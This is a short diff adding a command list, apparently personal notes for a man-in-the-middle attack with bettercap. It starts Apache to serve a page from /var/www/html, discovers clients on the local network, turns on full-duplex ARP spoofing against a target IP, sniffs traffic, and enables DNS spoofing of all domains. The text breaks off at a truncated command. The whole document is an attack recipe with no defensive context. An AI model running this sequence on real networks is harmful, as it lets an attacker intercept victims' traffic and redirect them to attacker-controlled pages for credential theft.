@@ -1,0 +1,17 @@
+ipconfig
+service apche2 start
+cd /var/www/html
+bettercap -iface eth0
+help
+net.probe on  --discover client
+net.show
+help arp.spoof
+set arp.spoof.fullduplex true
+set arp.spoof.targets IP
+arp.spoof on
+net.sniff on
+help dns.spoof
+set dns.spoof.all true
+set dns.spoof.domains 
+dns.spoof on
+se
